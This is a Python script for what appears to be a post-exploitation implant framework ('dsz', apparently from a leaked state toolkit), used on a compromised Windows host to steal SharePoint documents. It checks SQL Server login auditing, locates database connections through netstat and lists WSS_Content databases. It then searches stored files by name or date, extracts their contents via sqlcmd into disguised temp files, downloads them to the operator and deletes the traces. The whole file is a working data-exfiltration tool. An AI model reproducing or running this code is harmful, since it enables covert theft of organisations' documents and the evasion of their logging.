
import dsz
import dsz.lp
import sys
import re
import string
import time
import dsz.file

def main():
    global getfilesdir
    global sqlcmd
    global namedpipe
    global activedb
    dsz.cmd.Run('registryquery -hive L -key "software\\microsoft\\microsoft sql server\\mssql.1\\mssqlserver" -value AuditLevel')
    dsz.ui.Echo('**************************************************', dsz.WARNING)
    dsz.ui.Echo('* Audit Levels\t\t\t\t\t', dsz.WARNING)
    dsz.ui.Echo('* 0 = No logging\t\t\t\t\t', dsz.WARNING)
    dsz.ui.Echo('* 1 = Successful Logins Only\t\t\t', dsz.WARNING)
    dsz.ui.Echo('* 2 = Failed Logins Only (Default)\t\t', dsz.WARNING)
    dsz.ui.Echo('* 3 = Both successful and failed logins\t\t', dsz.WARNING)
    dsz.ui.Echo('* As SYSTEM we are probably ok with either 0 or 2\t', dsz.WARNING)
    dsz.ui.Echo('**************************************************', dsz.WARNING)
    if (not dsz.ui.Prompt('\nGiven the above information do you wish to coninue?')):
        return True
    (windir, sysdir) = dsz.path.windows.GetSystemPaths()
    getfilesdir = (dsz.lp.GetLogsDirectory() + '\\GetFiles\\')
    dsz.control.echo.Off()
    dsz.cmd.Run(('local mkdir %s' % getfilesdir))
    try:
        print 'Attempting to find sqlcmd.exe\n'
        dsz.cmd.Run('dir -mask sqlcmd.exe -path * -recursive', dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        [sqlcmdpath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
        sqlcmd = (sqlcmdpath + '\\sqlcmd.exe')
        print ('SQLCMD Location: %s ' % sqlcmd)
    except:
        (dsz.ui.Echo('Cannot find SQLCMD.exe!!!', dsz.WARNING),)
        sqlcmd = dsz.ui.GetString('Please enter the path to SQLCMD.exe: ')
    namedpipe = findConnection()
    activedb = findWSSContent()
    menuLoop()
    return True

def menuLoop():
    global namedpipe
    global activedb
    dsz.ui.Echo('')
    menuoption = (-1)
    while (menuoption != 0):
        for i in ('', '  SharePoint Database Collection', ('  SQLCMD EXE Location: %s' % sqlcmd), ('  Connection Method: %s' % namedpipe), ('  Active Database: %s' % activedb), '', '  0)  Exit', '', 'Setup', '  1)  Change Database Connection Method', '  2)  Change Active Database', '', 'Query Options', '  3)  List number of files in database', '  4)  Search for files by date range', '  5)  Search for a file by name', ''):
            dsz.ui.Echo(i)
        menuoption = dsz.ui.GetInt('Enter menu option:', '0')
        if (menuoption == 1):
            namedpipe = findConnection()
        elif (menuoption == 2):
            activedb = findWSSContent()
        elif (menuoption == 3):
            countFiles()
        elif (menuoption == 4):
            dateQuery()
        elif (menuoption == 5):
            stringQuery()

def findConnection():
    dsz.control.echo.Off()
    dsz.cmd.Run('log netstat', dsz.RUN_FLAG_RECORD)
    [procid] = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)
    dsz.cmd.Run(('local dir -mask *%s* -path %s\\..\\Logs' % (procid, getfilesdir)), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    [datafilepath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
    [datafilename] = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
    datafile = ((datafilepath + '\\') + datafilename)
    counter = 1
    pipedict = {}
    f = open(('%s' % datafile), 'r')
    with f as input:
        for line in input:
            if (re.search('1433', line) and re.search('Listening', line)):
                match = re.match('.*([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}:[0-9]{1,5}).*', line)
                ip = match.group(1)[0:match.group(1).find(':')]
                if (ip == '0.0.0.0'):
                    ip = '127.0.0.1'
                pipedict[counter] = (ip + ',1433')
                counter += 1
            elif (re.search('sql', line) and re.search('query', line)):
                pipedict[counter] = ('np:' + line.replace('Pipe    ', '').strip())
                counter += 1
        print 'The following possible sql connection methods were found!\n'
        for i in pipedict:
            print ('%s)     %s' % (i, pipedict[i]))
        print ''
        selection = dsz.ui.GetInt('Please select a database connection method from the list above: ')
        return pipedict[selection]

def findWSSContent():
    query = 'SELECT * FROM master..sysdatabases'
    dsz.control.echo.Off()
    dsz.cmd.Run(('log run -command "\\"%s\\" -E -S %s -Q \\"%s\\" -y 0 -s ," -redirect' % (sqlcmd, namedpipe, query)), dsz.RUN_FLAG_RECORD)
    [procid] = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)
    dsz.cmd.Run(('local dir -mask *%s* -path %s\\..\\Logs' % (procid, getfilesdir)), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    [datafilepath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
    [datafilename] = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
    datafile = ((datafilepath + '\\') + datafilename)
    counter = 1
    dict = {}
    f = open(('%s' % datafile), 'r')
    with f as input:
        for line in input:
            if (not re.search('WSS_Content', line)):
                continue
            tokens = string.split(line, ',')
            dict[counter] = string.strip(tokens[0])
            print ('%s  )  %s' % (counter, string.strip(tokens[0])))
            counter += 1
    f.close()
    if (dict != {}):
        selection = dsz.ui.GetInt('Please select a database to query: ')
        return dict[selection]
    else:
        dsz.ui.Echo('No WSS_Content databases found, try a different connection method!', dsz.WARNING)
        return None

def countFiles():
    query = "SELECT count(*) from Docs where IsCurrentVersion='True' and Size>0"
    dsz.cmd.Run(('log run -command "\\"%s\\" -E -S %s -d %s -Q \\"%s\\" -y 0 -s ," -redirect' % (sqlcmd, namedpipe, activedb, query)), dsz.RUN_FLAG_RECORD)

def stringQuery():
    filename = dsz.ui.GetString('Enter the string you wish to search for: ')
    filename = (('%' + filename) + '%')
    query = ("SELECT DirName,LeafName,Id,Size,TimeLastModified,TimeCreated from Docs where LeafName LIKE '%s' AND (IsCurrentVersion='True') AND (Size>0) order by DirName,LeafName" % filename)
    dsz.control.echo.Off()
    dsz.cmd.Run(('log run -command "\\"%s\\" -E -S %s -d %s -Q \\"%s\\" -u -y 0 -s ," -redirect' % (sqlcmd, namedpipe, activedb, query)), dsz.RUN_FLAG_RECORD)
    [procid] = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)
    dsz.cmd.Run(('local dir -mask *%s* -path %s\\..\\Logs' % (procid, getfilesdir)), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    [datafilepath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
    [datafilename] = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
    datafile = ((datafilepath + '\\') + datafilename)
    formatstring = '%3s ) %-25s   %-10s %s'
    print (formatstring % ('Num:', 'Last Modified', 'Size', 'FileName:'))
    print (formatstring % ('----', '-------------', '----', '---------'))
    counter = 1
    dict = {}
    f = open(('%s' % datafile), 'r')
    with f as input:
        for line in input:
            tokens = string.split(line, ',')
            if ((len(tokens) != 6) or re.search('LeafName', line) or re.search('--------', line)):
                continue
            (dirname, leafname, id, size, timelastmodified, timecreated) = (string.strip(tokens[0]), string.strip(tokens[1]), string.strip(tokens[2]), string.strip(tokens[3]), string.strip(tokens[4]), string.strip(tokens[5]))
            fullpath = ((dirname + '/') + leafname)
            print (formatstring % (counter, timelastmodified, size, fullpath))
            iddata = ((id + '|') + leafname)
            dict[counter] = iddata
            counter += 1
    f.close()
    try:
        if dsz.ui.Prompt('\nWould you like to pull any of the above files?'):
            selection = string.split(dsz.ui.GetString('Enter your selection (1,2,3-5,7,8-10)'), ',')
            toget = []
            for i in selection:
                num = string.split(i.strip(), '-')
                if (len(num) > 1):
                    inrange = range(int(num[0]), (int(num[1]) + 1))
                    for j in inrange:
                        toget.append(j)
                else:
                    toget.append(int(num[0]))
            for k in toget:
                (fileid, filename) = string.split(dict[k], '|')
                collectandparse(fileid, filename)
    except:
        dsz.ui.Echo('Numbers are hard!', dsz.WARNING)

def dateQuery():
    afterdate = dsz.ui.GetString('Enter the date you wish to search after YYYY-MM-DD:')
    beforedate = dsz.ui.GetString('Enter the date you wish to search before YYYY-MM-DD:')
    query = ("SELECT DirName,LeafName,Id,Size,TimeLastModified,TimeCreated from Docs where ((TimeLastModified between '%s' AND '%s') or (TimeCreated between '%s' AND '%s')) AND (IsCurrentVersion='True') AND (Size>0) order by TimeLastModified,TimeCreated" % (afterdate, beforedate, afterdate, beforedate))
    dsz.control.echo.Off()
    dsz.cmd.Run(('log run -command "\\"%s\\" -E -S %s -d %s -Q \\"%s\\" -u -y 0 -s ," -redirect' % (sqlcmd, namedpipe, activedb, query)), dsz.RUN_FLAG_RECORD)
    [procid] = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)
    dsz.cmd.Run(('local dir -mask *%s* -path %s\\..\\Logs' % (procid, getfilesdir)), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    [datafilepath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
    [datafilename] = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
    datafile = ((datafilepath + '\\') + datafilename)
    formatstring = '%3s ) %-25s   %-10s %s'
    print (formatstring % ('Num:', 'Last Modified', 'Size', 'FileName:'))
    print (formatstring % ('----', '-------------', '----', '---------'))
    counter = 1
    dict = {}
    f = open(('%s' % datafile), 'r')
    with f as input:
        for line in input:
            tokens = string.split(line, ',')
            if ((len(tokens) != 6) or re.search('LeafName', line) or re.search('--------', line)):
                continue
            (dirname, leafname, id, size, timelastmodified, timecreated) = (string.strip(tokens[0]), string.strip(tokens[1]), string.strip(tokens[2]), string.strip(tokens[3]), string.strip(tokens[4]), string.strip(tokens[5]))
            fullpath = ((dirname + '/') + leafname)
            print (formatstring % (counter, timelastmodified, size, fullpath))
            iddata = ((id + '|') + leafname)
            dict[counter] = iddata
            counter += 1
    f.close()
    try:
        if dsz.ui.Prompt('\nWould you like to pull any of the above files?'):
            selection = string.split(dsz.ui.GetString('Enter your selection (1,2,3-5,7,8-10)'), ',')
            toget = []
            for i in selection:
                num = string.split(i.strip(), '-')
                if (len(num) > 1):
                    inrange = range(int(num[0]), (int(num[1]) + 1))
                    for j in inrange:
                        toget.append(j)
                else:
                    toget.append(int(num[0]))
            for k in toget:
                (fileid, filename) = string.split(dict[k], '|')
                collectandparse(fileid, filename)
    except:
        dsz.ui.Echo('Numbers are hard!', dsz.WARNING)

def collectandparse(fileid, filename):
    queryfile = open(('%s\\..\\query.sql' % getfilesdir), 'w')
    query = (":XML ON\nSELECT Content FROM AllDocStreams where Id='%s'\nGO" % fileid)
    queryfile.write(query)
    queryfile.close()
    (windir, sysdir) = dsz.path.windows.GetSystemPaths()
    queryupload = ('%s\\temp\\~W0128a.tmp' % windir)
    outfile = ('%s\\temp\\~P01s6a4.tmp' % windir)
    dsz.control.echo.Off()
    dsz.cmd.Run(('put %s\\..\\query.sql -name %s' % (getfilesdir, queryupload)))
    dsz.cmd.Run(('run -command "\\"%s\\" -E -S %s -d %s -i %s -o %s -y0 -s ," -redirect' % (sqlcmd, namedpipe, activedb, queryupload, outfile)), dsz.RUN_FLAG_RECORD)
    dsz.cmd.Run(('del %s' % queryupload))
    dsz.control.echo.On()
    dsz.ui.Echo(('Starting Download of %s' % filename))
    dsz.control.echo.Off()
    dsz.cmd.Run(('get %s' % outfile), dsz.RUN_FLAG_RECORD)
    [savedname] = dsz.cmd.data.Get('filelocalname::localname', dsz.TYPE_STRING)
    outname = ((time.strftime('%Y-%m-%d-%H.%M.%S', time.localtime()) + '_') + filename)
    dsz.cmd.Run(('del %s' % outfile))
    dsz.cmd.Run(('local move "%s\\%s" "%s\\%s"' % (getfilesdir, savedname, getfilesdir, outname)))
    dsz.control.echo.On()
    dsz.ui.Echo(('File successfully saved to: %s\\%s\n' % (getfilesdir, outname)))
if (__name__ == '__main__'):
    if (main() != True):
        dsz.ui.Echo('Script aborted due to errors.', dsz.WARNING)
        sys.exit((-1))